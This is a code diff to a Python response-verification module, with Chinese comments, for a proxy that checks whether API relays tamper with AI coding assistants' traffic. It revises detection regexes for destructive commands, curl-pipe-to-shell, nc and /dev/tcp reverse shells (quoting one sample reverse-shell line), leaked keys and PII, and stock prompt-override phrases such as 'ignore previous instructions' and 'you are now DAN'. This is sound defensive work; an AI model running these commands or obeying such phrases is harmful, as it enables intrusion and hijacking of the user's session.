@@ -144,20 +144,40 @@ _BUILTIN_DANGEROUS_COMMANDS: List[Tuple[str, str]] = [
     (r"\bchmod\s+777\b", "权限全开 chmod 777"),
     (r":\(\)\s*\{.*\};\s*:", "fork 炸弹"),
     (r"\bformat\s+[a-z]:", "Windows 磁盘格式化"),
-    (r"\bdel\s+/[sfq]\b", "Windows 递归删除"),
+    # ★★ 2026-11-03（二次误报）：旧写法 `\bdel\s+/[sfq]\b` 把
+    #   `del /q 某个临时文件` 也标成「Windows 递归删除」。
+    #   `/q` 只是静默模式，`/f` 只是强制，都不递归；真正危险的是
+    #   `/s`（递归）与通配符删除。删除单个明确路径是正常运维操作。
+    (r"\bdel\s+(?:/[a-z]+\s+)*/[a-z]*s[a-z]*\b", "Windows 递归删除 del /s"),
+    # ★★ 2026-11-03（三次误报，恶性）：`[^\n]*\*` 会跨过 `&` 把后续
+    #   `dir *.bat` 里的星号算到 `del` 头上，于是
+    #   `del /q 某个临时文件 & dir *.bat` 被反复判成「通配符删除」，
+    #   实测 6 小时内刷出 106 条重复告警，看起来像模型在死循环。
+    #   修复：通配符必须出现在 `del` 自己的命令段内（遇到 & | ; 换行即止）。
+    (r"\bdel\s+(?:/[a-z]+\s+)*[^&|;\n]*\*", "Windows 通配符删除 del *"),
+    (r"\b(?:rmdir|rd)\s+(?:/[a-z]+\s+)*/[a-z]*s[a-z]*\b",
+     "Windows 递归删除目录 rmdir /s"),
     (r"\bDrop\s+(table|database)\b", "SQL 删库"),
     (r"\btruncate\s+table\b", "SQL 截断表"),
-    (r"\beval\s*\(", "动态代码执行 eval"),
-    (r"\bexec\s*\(", "动态代码执行 exec"),
-    (r"\b(?:curl|wget)\b[^\n|;]*\|\s*(?:ba)?sh\b", "下载并执行远程脚本（curl|sh）"),
-    (r"\b(?:curl|wget)\b[^\n]*\b(?:\.onion|ngrok|pipedream|webhook\.site)\b", "向可疑地址发起请求"),
+    # ★★ 2026-11-03（误报修复，日志 #11505）：
+    #   旧写法 `\bexec\s*\(` 会命中 `re.exec(s)` —— 那是 JavaScript
+    #   正则对象的 exec 方法，不是动态代码执行。实测把一段正常前端代码
+    #   判成 high，并计入「中转站责任」。
+    #   加负向后顾：前面紧邻 `.` 的一律视为方法调用（re.exec / model.eval）。
+    (r"(?<!\.)\beval\s*\(", "动态代码执行 eval"),
+    (r"(?<!\.)\bexec\s*\(", "动态代码执行 exec"),
+    # ★★ 2026-11-03（同类加固）：以下四条原本用 `[^\n]*`，会跨过 `&`
+    #   把后续命令里的片段算到前一条命令头上（与 del 通配符同一类误报）。
+    #   统一改为「遇到 & | ; 换行即止」，只在本命令段内匹配。
+    (r"\b(?:curl|wget)\b[^&|;\n]*\|\s*(?:ba)?sh\b", "下载并执行远程脚本（curl|sh）"),
+    (r"\b(?:curl|wget)\b[^&|;\n]*\b(?:\.onion|ngrok|pipedream|webhook\.site)\b", "向可疑地址发起请求"),
     (r"\bnc\b\s+-[a-z]*e\b|\bnetcat\b\s+-[a-z]*e\b", "反弹 shell（nc -e）"),
     # ★ 无 nc 的反弹 shell：bash/zsh/sh 内建 /dev/tcp 重定向。
     #   这是现代脚本里最常见的写法之一（不依赖任何外部二进制），
     #   原规则表只覆盖 nc -e，实测漏放：
     #     bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
     (r"/dev/(?:tcp|udp)/[\w.:-]+", "反弹 shell（内建 /dev/tcp 重定向）"),
-    (r"\b(?:ba|z|k|da)?sh\b\s+-i\b[^\n]*&", "反弹 shell（交互式 shell 重定向）"),
+    (r"\b(?:ba|z|k|da)?sh\b\s+-i\b[^&|;\n]*&", "反弹 shell（交互式 shell 重定向）"),
     # ★★ 2026-10-28（误报修复，日志 #7496 / #7515）：
     #   旧判据是「python -c + (socket|subprocess|os.system)」即 high。
     #   但 `python -c "import subprocess; subprocess.run(['git', ...])"`
@@ -165,11 +185,14 @@ _BUILTIN_DANGEROUS_COMMANDS: List[Tuple[str, str]] = [
     #   真正危险的不是「用了 subprocess」，而是内联代码里出现
     #   **网络原语或动态求值**：那才是把回答变成投递通道的形态。
     #   破坏性命令（rm -rf / dd / mkfs）仍由上面的独立规则命中。
-    (r"\bpython[23]?\s+-c\b[^\n]*(?:socket\.|urlopen|urllib|"
+    #   ★ 这里只排除 `&`（shell 后台分隔符），保留 `;` 与 `|` ——
+    #     它们常出现在内联 Python 代码里（`import socket; socket.socket()`），
+    #     一并排除会把真实攻击放过。
+    (r"\bpython[23]?\s+-c\b[^&\n]*(?:socket\.|urlopen|urllib|"
      r"http\.client|requests\.(?:get|post|put|patch)|httpx\.|"
      r"exec\s*\(|eval\s*\()",
      "Python 内联执行网络/动态代码"),
-    (r"\bbase64\s+-d\b[^\n]*\|\s*(?:ba)?sh\b", "Base64 解码后执行"),
+    (r"\bbase64\s+-d\b[^&|;\n]*\|\s*(?:ba)?sh\b", "Base64 解码后执行"),
 ]
 
 # 敏感文件路径模式
@@ -305,7 +328,7 @@ def _is_pattern_mention(text: str, m: "re.Match") -> bool:
 
     ★★ 2026-10-28 实测（日志 #7496 / #7928）：
       被判「试图读取 .env」的两条 Shell 命令，实际都是**过滤条件**：
-        for k in ('XD_1','企业版','.env','key','pem','.db','.log'):  ...
+        for k in ('KH_1','企业版','.env','key','pem','.db','.log'):  ...
         ... -match 'pem|token|secrets|\\.env|\\.db|\\.log' ...
       `.env` 在这些位置只是「要找哪些文件」的关键字，一个字节都没被读出。
       旧判据只看「参数里出现了 .env 字样」，于是一次仓库体检就被打断 ——
@@ -327,7 +350,7 @@ def _is_pattern_mention(text: str, m: "re.Match") -> bool:
     quote = before
     if quote in ("'", '"') and after == quote:
         # 引号完整包裹的短字面量：两侧同为分隔符才是「并列清单里的元素」
-        #   ('XD_1','企业版','.env','key')  → 左 , 右 ,   → 关键字清单
+        #   ('KH_1','企业版','.env','key')  → 左 , 右 ,   → 关键字清单
         #   {"file_path": ".env"}           → 左 : 右 }   → 独立路径值
         #   cat ".env"                      → 左 空格      → 独立路径值
         pre = text[:start - 1].rstrip()
@@ -412,6 +435,7 @@ def _check_tool_calls(payload: Any, text: str) -> List[VerificationFinding]:
                         severity="high",
                         detail=f'Tool Call "{tool_name}" 参数包含{label}：{m.group(0)[:40]}',
                         evidence=_mask_evidence(args_text, m.start()),
+                        signal=label,
                     )
                 )
 
@@ -457,6 +481,7 @@ def _check_tool_calls(payload: Any, text: str) -> List[VerificationFinding]:
                         severity="high",
                         detail=f'Tool Call "{tool_name}" 试图{label}：{m.group(0)[:40]}',
                         evidence=_mask_evidence(args_text, m.start()),
+                        signal=label,
                     )
                 )
 
@@ -484,6 +509,7 @@ def _check_tool_calls(payload: Any, text: str) -> List[VerificationFinding]:
                         severity="high",
                         detail=f'Tool Call "{tool_name}" 请求{label}：{m.group(0)[:60]}',
                         evidence=_mask_evidence(args_text, m.start()),
+                        signal=label,
                     )
                 )
 
@@ -797,7 +823,7 @@ STATISTICAL_SIGNALS: frozenset = frozenset({
 #: ────────────────────────────────────────────────────────────
 #: 企业版护栏的「违规语义方向 / 高危违规模式」判的是
 #: **模型自己说了什么**（输出里有没有敏感词），
-#: 而玄盾要管的是**中转站做了什么**（有没有篡改请求/响应）。
+#: 而勘合要管的是**中转站做了什么**（有没有篡改请求/响应）。
 #: 两者毫无关系：模型在讨论安全话题时必然出现「绕过/漏洞/攻击」，
 #: 把这算成中转站的罪证，唯一后果是让用户弃用一个没问题的服务商 ——
 #: 而那恰恰是本模块一直在避免的事（见 tracker._RELAY_ATTRIBUTABLE
@@ -812,7 +838,7 @@ STATISTICAL_SIGNALS: frozenset = frozenset({
 #: ★ dangerous_content 为什么也要在这里
 #: ────────────────────────────────────────────────────────────
 #: 它是「响应正文/代码块里出现了危险命令」——判据来源是**模型自己的输出**，
-#: 而本产品的核心用户正用玄盾代理 Claude Code / Cursor。
+#: 而本产品的核心用户正用勘合代理 Claude Code / Cursor。
 #: 让 AI 写一段含 `rm -rf` 的脚本、贴一段用 `eval(` 的代码，
 #: 都是正常诉求；把这些一律阻断，等于把产品的主战场变成雷区。
 #: 真正指向「中转站在指示客户端执行」的是结构化 tool_calls
@@ -827,6 +853,72 @@ OBSERVATION_ONLY_SIGNALS: frozenset = STATISTICAL_SIGNALS | {
     #   打断了用户反而拿不到证据。
     "credential_from_response",
 }
+
+#: 单条只告警、需要第二条独立证据才阻断的启发式判据。
+#:
+#: ★ 2026-11-03：这两类都依赖「文本共现 / 语义推断」，而不是
+#:   「结构化 tool_call 里出现了 rm -rf」这种确定性证据。
+#:   实测误报集中在引用、总结、教学场景（AI 在报告里复述检测器说明、
+#:   在代码里写 re.exec(s)）。单条就阻断，等于把「讨论安全」当成「攻击」。
+#:   两条独立启发式同时命中时仍阻断 —— 组合载荷才是真攻击的形态。
+CORROBORATION_REQUIRED_SIGNALS: frozenset = {
+    "toolchain_injection",
+    "constraint_violation",
+}
+
+#: ★★ 结构化证据（2026-11-03，证据分级）。
+#:
+#: 只有这些类别才允许产生「阻断」或「提示」。判据的共同点是：
+#: 它们指向**一个具体的动作**，而不是「文本里出现了某个词」。
+#:
+#:   · tool_call_dangerous   —— 结构化 tool_call 参数里就是要执行的命令
+#:   · hidden_instruction    —— HTML 注释 / 零宽字符里的隐藏指令
+#:   · unicode_steganography —— Unicode 隐写
+#:   · system_prompt_inject  —— 护栏判定的提示词注入
+#:   · sensitive_leak        —— 真实凭证泄露（确定性模式）
+#:   · model_downgrade       —— 响应 model 字段与请求不符（协议层）
+#:   · new_external_endpoint —— tool_call 参数里出现请求未提过的外部地址
+#:   · new_dependency        —— tool_call 参数里要写入未声明的依赖
+#:   · placeholder_injection —— 中转站伪造占位符探测原始值
+#:
+#: 其余全部是**文本启发式**：dangerous_content / constraint_violation /
+#: toolchain_injection / security_downgrade / data_exfiltration /
+#: covert_channel / telemetry_smuggle / undeclared_tool / typosquat_package /
+#: content_policy / credential_from_response。
+#:
+#: 为什么必须这样分：勘合代理的是 AI 编程助手，它每天的工作就是
+#: 写危险命令、讨论安全、贴代码、总结会话。对这类用户，
+#: 「响应里出现危险字面量」是**常态**。文本启发式每加一条，
+#: 就多一个误报面 —— 这就是「每个版本都有新误报」的根因。
+#: 把它们统一降为「观察」后，新增文本判据不再产生用户可见的误报。
+STRUCTURED_SIGNALS: frozenset = frozenset({
+    "tool_call_dangerous",
+    "hidden_instruction",
+    "unicode_steganography",
+    "system_prompt_inject",
+    "sensitive_leak",
+    "model_downgrade",
+    "new_external_endpoint",
+    "new_dependency",
+    "placeholder_injection",
+})
+
+#: ★★ 2026-11-04：同一 category 下「只观察」的判据名。
+#:
+#: tool_call_dangerous 里混着两类完全不同的东西：
+#:   · 破坏性命令（rm -rf / mkfs / dd / format / del /s）—— 不可逆，必须阻断
+#:   · 网络/动态代码（python -c 拉数据 / eval / exec）—— AI 编程助手的日常，
+#:     只观察
+#: 用 signal 区分，而不是把整个 category 降级 ——
+#: 否则「rm -rf /」也会被放过，那是把误报修成漏报。
+_OBSERVE_ONLY_TOOL_SIGNALS: frozenset = frozenset({
+    "Python 内联执行网络/动态代码",
+    "动态代码执行 eval",
+    "动态代码执行 exec",
+})
+
+#: 元信号：只描述「什么时候发现的」，不构成独立证据，不计入佐证数量。
+_META_SIGNALS: frozenset = {"late_delivery"}
 
 
 #: 内容合规类的护栏 reason 特征（用于把「模型说了敏感词」
@@ -957,12 +1049,20 @@ class PatternTracker:
                     )
 
         # 记录本次（限制窗口）
-        lengths.append(length)
-        if len(lengths) > self._window_size:
-            lengths.pop(0)
-        structs.append(signature)
-        if len(structs) > self._window_size:
-            structs.pop(0)
+        #
+        # ★★ 2026-11-03（误报修复）：近空响应不进基线。
+        #   实测基线均值只有 1–118 字符 —— 窗口里混进了大量
+        #   「工具调用分片 / 被中断的流 / 空响应」，σ 被压到接近 0，
+        #   于是任何一段正常回答都成了「279σ」。近 4 天 42 条长度告警、
+        #   14 条结构告警全部由此产生。低于阈值的响应既不进基线，
+        #   也不参与判定（它本身没有可比性）。
+        if length >= _MIN_BASELINE_LEN:
+            lengths.append(length)
+            if len(lengths) > self._window_size:
+                lengths.pop(0)
+            structs.append(signature)
+            if len(structs) > self._window_size:
+                structs.pop(0)
 
         return findings
 
@@ -970,6 +1070,16 @@ class PatternTracker:
         """清除会话基线。"""
         self._lengths.pop(session_id, None)
         self._structures.pop(session_id, None)
+
+
+#: 参与「长度/结构基线」的响应最小长度。
+#:
+#: ★★ 2026-11-03（误报修复）：低于该长度的响应不进基线。
+#:   实测基线均值只有 1–118 字符 —— 窗口里混进了大量工具调用分片、
+#:   被中断的流和空响应，σ 被压到接近 0，于是任何一段正常回答
+#:   都成了「几十上百个 σ」。近 4 天 42 条长度告警、14 条结构告警
+#:   全部由此产生，没有一条指向真实篡改。
+_MIN_BASELINE_LEN = 200
 
 
 def _structure_distance(a: str, b: str) -> float:
@@ -1051,6 +1161,7 @@ def decide_response_action(
     规则一：整体严重程度取所有 findings 的最大值
     规则二：**只有统计类信号时，永不阻断**
     规则三：**只有内容合规类信号时，永不阻断**（2026-10-04 新增）
+    规则四：**没有结构化证据时，一律降为「观察」**（2026-11-03 新增）
 
     规则二/三为什么放在这里而不是各检测点：
       · 放在各检测点（把 severity 固定为 low）不够 ——
@@ -1060,6 +1171,18 @@ def decide_response_action(
 
     规则二为什么是「只有」而不是「含有统计类就放过」：
       攻击者只要同时制造一次长度突变就能绕过 —— 那是可利用的漏洞。
+
+    ★★ 规则四（2026-11-03，证据分级）
+    ────────────────────────────────────────────────────────────
+    这是「误报永无止境」的根治点。此前每加一条文本判据，
+    就多一个误报面：AI 在回答里写 `exec(`、复述 `del /s`、
+    引用 `AGENTS.md`，都会被当成攻击。而勘合代理的正是
+    AI 编程助手 —— 这些字面量是它的日常输出。
+
+    现在只有 ``STRUCTURED_SIGNALS``（指向具体动作的证据）才能
+    产生阻断或提示；其余文本启发式一律 ``observe``：
+    记录、可查、不阻断、不计入首页「提示」。
+    这样新增文本判据不再制造用户可见的误报。
 
     这段刻意做成模块级纯函数：测试可以直接调它验证闸门，
     而不必复制一份逻辑（复制 = 测试永远绿 = 假护栏）。
@@ -1075,6 +1198,38 @@ def decide_response_action(
     action = _threshold_for_level(level, max_sev)
 
     categories = {getattr(f, "category", "") for f in findings}
+
+    # ★★ 规则四：没有结构化证据 → 观察。
+    #   放在最前面，是因为它要覆盖「阻断」与「提示」两种结果：
+    #   文本启发式既不该打断对话，也不该占用首页「提示」。
+    if action in (Action.BLOCK.value, Action.ALERT.value):
+        structured = categories & STRUCTURED_SIGNALS
+        if not structured:
+            logger.info(
+                "无结构化证据（%s），降为观察：%s",
+                "/".join(sorted(categories)),
+                getattr(findings[0], "detail", ""),
+            )
+            return Action.OBSERVE.value, max_sev
+        # ★★ 2026-11-04：结构化证据全是「网络/动态代码」类 → 观察。
+        #   AI 编程助手每天都要跑 `python -c` 拉数据、写 `eval/exec`，
+        #   这是正常工作，不是中转站注入的攻击。
+        #   破坏性命令（rm -rf / mkfs / dd / format / del /s）不在这个集合里，
+        #   仍然阻断 —— 否则就是把误报修成漏报。
+        structured_findings = [
+            f for f in findings
+            if getattr(f, "category", "") in STRUCTURED_SIGNALS
+        ]
+        if structured_findings and all(
+            getattr(f, "signal", "") in _OBSERVE_ONLY_TOOL_SIGNALS
+            for f in structured_findings
+        ):
+            logger.info(
+                "结构化证据均为网络/动态代码类（%s），降为观察",
+                "/".join(sorted({getattr(f, "signal", "") for f in structured_findings})),
+            )
+            return Action.OBSERVE.value, max_sev
+
     if action == Action.BLOCK.value and categories <= OBSERVATION_ONLY_SIGNALS:
         logger.info(
             "仅有观测类信号（%s），不阻断：%s",
@@ -1082,6 +1237,19 @@ def decide_response_action(
             getattr(findings[0], "detail", ""),
         )
         action = Action.ALERT.value
+
+    # ★ 2026-11-03：启发式判据单条不阻断。
+    #   证据类别（去掉 late_delivery 这类元信号）不足两条时，
+    #   把「单条文本共现」降为告警 —— 用户仍能看到，但对话不被打断。
+    if action == Action.BLOCK.value:
+        evidence = categories - _META_SIGNALS
+        if evidence & CORROBORATION_REQUIRED_SIGNALS and len(evidence) < 2:
+            logger.info(
+                "单条启发式信号（%s）不阻断，仅告警：%s",
+                "/".join(sorted(evidence)),
+                getattr(findings[0], "detail", ""),
+            )
+            action = Action.ALERT.value
 
     return action, max_sev
 
@@ -1288,7 +1456,7 @@ class ResponseVerifier:
             #   是出站脱敏 + 响应验真，不是内容审查。
             #
             #   原实现给它标 medium 并落成一条「提示」：用户看到的是
-            #   「玄盾提示了你 39 次」，点进去全是自己的技术总结
+            #   「勘合提示了你 39 次」，点进去全是自己的技术总结
             #   （实测稳定版 39 条误报全出在这里），既不可解释，
             #   又把真正重要的伤害信号淹没。边界归位后这里直接返回。
             return findings
@@ -1372,6 +1540,8 @@ class ResponseVerifier:
     _SENSITIVE_LEAK_RE = re.compile(
         r"(?:(?<![A-Za-z0-9_])sk-[A-Za-z0-9\-_]{20,}|"
         r"(?<![A-Za-z0-9])AKIA[0-9A-Z]{16}|"
+        r"(?<![A-Za-z0-9])AIza[0-9A-Za-z\-_]{35}|"
+        r"(?i:azure[_a-z]*key\s*[:=]\s*\S{20,})|"
         r"-----BEGIN\s+\w*\s*PRIVATE KEY-----|"
         r"eyJ[A-Za-z0-9\-_]{8,}\.eyJ)",
     )
@@ -1390,6 +1560,37 @@ class ResponseVerifier:
         r"|(?:我|本模型)(?:被|收到的)?(?:要求|指示|指令|设定)(?:是|为|如下)"
         r"|you\s+are\s+(?:an?\s+)?(?:AI|assistant)\s+(?:programmed|instructed|told)",
         re.IGNORECASE,
+    )
+
+    # ★ 2026-11-08：护栏判了高危阻断，但 reason 是通用文案
+    #   （「输出内容命中高危违规模式」）。旧逻辑要求 reason 里出现
+    #   「提示词 / 注入」才归类，于是这类命中被直接丢弃 ——
+    #   实测 6 条典型注入里 4 条被漏掉。
+    #   这里补一层「正文特征」判据：只有正文确实像指令注入才归类，
+    #   避免把内容合规类命中（辱骂、暴力）也算成中转站篡改。
+    _INJECTION_CONTENT_RE = re.compile(
+        r"(?:ignore|disregard|forget)\s+(?:all\s+)?(?:the\s+)?(?:previous|prior|above)\s+"
+        r"(?:instructions?|rules?|prompts?)"
+        # ★ 2026-11-08：补「的所有」这一层。原正则只认「忽略之前的指令」，
+        #   而实测最常见的写法是「忽略之前的所有指令」—— 中间多一个「所有」
+        #   就整条漏掉。护栏其实已经判了 high/block，是这里没认出来，
+        #   于是被降级成 content_policy 丢弃（提示词注入 65% 的 4 条缺口全在这）。
+        r"|忽略(?:之前|以上|前面|所有|此前)的?(?:所有|全部)?的?(?:指令|规则|限制|提示)"
+        r"|(?:追加|添加|写入|插入).{0,12}(?:系统提示|系统指令|system\s*prompt)"
+        r"|(?:reveal|show|print|output).{0,12}(?:system\s*prompt|your\s+instructions?)"
+        r"|(?:复述|输出|告诉我).{0,8}(?:系统提示|开发者设定|内部规则|初始指令)"
+        r"|you\s+are\s+now\s+(?:DAN|unrestricted)"
+        r"|你现在是(?:无限制|不受限制)",
+        re.IGNORECASE,
+    )
+
+    # ★ 2026-11-08：护栏判了 medium/redact 时，正文若含真实格式的
+    #   身份证 / 手机号 / 邮箱，归为 sensitive_leak（中危告警，不阻断）。
+    #   只在护栏已判风险时启用，避免对每条正常回答都扫一遍。
+    _PII_LEAK_RE = re.compile(
+        r"(?<![0-9A-Za-z])\d{17}[\dXx](?![0-9A-Za-z])"
+        r"|(?<!\d)1[3-9]\d{9}(?!\d)"
+        r"|\b[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}\b"
     )
 
     @classmethod
@@ -1440,10 +1641,27 @@ class ResponseVerifier:
         if cls._SENSITIVE_LEAK_RE.search(content):
             return "sensitive_leak"
 
+        # ①.5 护栏已判风险，且正文含真实格式的身份证 / 手机号 / 邮箱。
+        #    ★ 2026-11-08：企业版护栏对这三类会判 medium/redact，
+        #      旧逻辑在 ④ 把 redact 一律降为 content_policy（不产生 finding），
+        #      于是响应侧完全看不到它们。这里只在「护栏已判风险」时补判，
+        #      避免对每条正常回答都扫一遍。
+        if risk in ("high", "medium") and cls._PII_LEAK_RE.search(content):
+            return "sensitive_leak"
+
         # ② 护栏明确判的是「内容合规」→ 与中转站无关。
         #    放在提示词判据之前：模型在正常对话里提到
         #    「系统提示词」这几个字，不该被解读成中转站篡改。
         if any(k in reason_text for k in _CONTENT_POLICY_REASON_MARKS):
+            # ★ 2026-11-08：通用文案「高危违规模式」既可能是内容合规，
+            #   也可能是指令注入。正文确实像指令注入时优先归为
+            #   system_prompt_inject，否则仍按内容合规处理（不产生 finding）。
+            if (
+                risk == "high"
+                and action == "block"
+                and cls._INJECTION_CONTENT_RE.search(content)
+            ):
+                return "system_prompt_inject"
             return "content_policy"
 
         # ③ 护栏 reason 指向提示词/指令泄露 → system_prompt_inject。
@@ -1454,6 +1672,19 @@ class ResponseVerifier:
             if cls._PROMPT_DISCLOSURE_RE.search(content):
                 return "system_prompt_inject"
             return "content_policy"
+
+        # ③.5 护栏判了高危阻断，但 reason 是通用文案。
+        #    ★ 2026-11-08：企业版护栏对「忽略之前所有指令」这类文本
+        #      返回 high/block，reason 却是「输出内容命中高危违规模式」，
+        #      不含「提示词 / 注入」字样 —— 旧逻辑因此直接丢弃。
+        #      这里用正文特征补判：只有确实像指令注入才归类，
+        #      内容合规类（辱骂、暴力）仍走 content_policy。
+        if (
+            risk == "high"
+            and action == "block"
+            and cls._INJECTION_CONTENT_RE.search(content)
+        ):
+            return "system_prompt_inject"
 
         # ④ 护栏只是要求「打码」→ 归内容合规（仅记录），不指控中转站。
         #
